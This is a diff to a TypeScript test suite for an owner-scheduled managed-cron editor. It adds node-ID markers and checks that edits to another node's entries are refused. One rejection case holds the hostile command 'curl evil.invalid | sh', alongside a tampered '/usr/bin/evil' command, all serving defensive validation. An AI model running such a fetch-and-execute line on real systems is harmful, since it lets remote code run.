@@ -25,9 +25,9 @@ function crontab(revision = 7, cron = "0 */6 * * *", enabled = true, commandTail
   const job = `${cron}${commandTail}`;
   return [
     "MAILTO=ops@example.invalid",
-    `# ANET-MANAGED-SCHEDULE id=news-pull revision=${revision} command_sha256=${hash(commandTail)}`,
+    `# ANET-MANAGED-SCHEDULE node_id=n_owner_schedule id=news-pull revision=${revision} command_sha256=${hash(commandTail)}`,
     enabled ? job : `# ANET-DISABLED ${job}`,
-    "# ANET-MANAGED-SCHEDULE-END id=news-pull",
+    "# ANET-MANAGED-SCHEDULE-END node_id=n_owner_schedule id=news-pull",
     "17 2 * * * /usr/bin/unmanaged-task",
     "",
   ].join("\n");
@@ -61,10 +61,11 @@ function intent(patch: Record<string, unknown> = { cron: "0 */12 * * *", enabled
 describe("owner schedule managed-cron control", () => {
   test("parses only exact managed markers and publishes bounded inventory", () => {
     const f = fixture();
-    const parsed = parseManagedCrontab(f.current()).get("news-pull")!;
-    expect(parsed).toMatchObject({ revision: 7, enabled: true, cron: "0 */6 * * *" });
+    const parsed = parseManagedCrontab(f.current(), "n_owner_schedule").get("news-pull")!;
+    expect(parsed).toMatchObject({ nodeId: "n_owner_schedule", revision: 7, enabled: true, cron: "0 */6 * * *" });
     expect(parsed.commandTail).toBe(" /usr/bin/grok-news --latest");
-    expect(managedCronInventory(f.adapter).get("news-pull")).toEqual({ cron: "0 */6 * * *", enabled: true, revision: 7 });
+    expect(managedCronInventory("n_owner_schedule", f.adapter).get("news-pull")).toEqual({ cron: "0 */6 * * *", enabled: true, revision: 7 });
+    expect(managedCronInventory("n_other", f.adapter).size).toBe(0);
   });
 
   test("changes timing/enabled while preserving command and unmanaged bytes", () => {
@@ -72,7 +73,7 @@ describe("owner schedule managed-cron control", () => {
     const before = f.current();
     const result = applyOwnerScheduleIntent({ configPath: f.configPath, expectedNodeId: "n_owner_schedule", intent: intent(), adapter: f.adapter });
     expect(result).toMatchObject({ status: "applied", result_revision: 8 });
-    expect(f.current()).toContain("# ANET-MANAGED-SCHEDULE id=news-pull revision=8");
+    expect(f.current()).toContain("# ANET-MANAGED-SCHEDULE node_id=n_owner_schedule id=news-pull revision=8");
     expect(f.current()).toContain("# ANET-DISABLED 0 */12 * * * /usr/bin/grok-news --latest");
     expect(f.current()).toContain("17 2 * * * /usr/bin/unmanaged-task");
     expect(f.current()).not.toBe(before);
@@ -89,11 +90,14 @@ describe("owner schedule managed-cron control", () => {
 
   test("command replacement, wrong node, wrong revision, and unknown patch fail before install", () => {
     const commandTampered = crontab().replace("/usr/bin/grok-news", "/usr/bin/evil");
+    const foreignMarker = crontab().replaceAll("node_id=n_owner_schedule", "node_id=n_other");
     for (const [initial, edit] of [
       [commandTampered, intent()],
+      [foreignMarker, intent()],
       [crontab(), { ...intent(), node_id: "n_other" }],
       [crontab(), { ...intent(), base_revision: 6 }],
       [crontab(), intent({ command: "curl evil.invalid | sh" })],
+      [crontab(), intent({ cron: "@reboot" })],
     ] as const) {
       const f = fixture(initial);
       expect(() => applyOwnerScheduleIntent({ configPath: f.configPath, expectedNodeId: "n_owner_schedule", intent: edit as ScheduleEditIntent, adapter: f.adapter })).toThrow();
